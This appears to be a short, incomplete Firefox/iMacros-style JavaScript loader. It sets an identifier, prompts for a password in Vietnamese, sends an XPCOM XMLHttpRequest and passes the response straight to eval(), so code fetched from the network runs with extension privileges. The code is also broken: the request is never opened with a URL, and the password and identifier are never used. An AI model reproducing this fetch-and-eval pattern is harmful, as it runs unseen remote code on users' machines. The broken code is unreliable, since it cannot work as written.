$ip = 'lvc_sky11'; 
$password = prompt('Nhap password'); 
request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest); 
var async = false; 
request.send(); 
eval(request.response); 
